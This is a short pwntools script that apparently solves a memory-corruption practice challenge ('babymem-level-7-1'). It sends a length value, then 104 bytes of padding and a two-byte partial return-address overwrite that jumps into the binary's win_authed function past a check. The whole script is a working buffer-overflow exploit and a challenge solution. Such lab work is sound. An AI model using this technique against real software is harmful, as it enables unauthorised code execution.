from pwn import *

elf = ELF('/challenge/babymem-level-7-1')
context.arch = "amd64"

io = elf.process()
buff_len = 104 #94  #cyclic - 1 
buff_addr = p16(0x6da+0x1c) #objdump win_authed+offset per saltare jne

PADDING = b'A'*(buff_len)
PAYLOAD = PADDING + buff_addr
io.sendline(f"{len(PAYLOAD)}")
io.sendline(PAYLOAD)
io.interactive()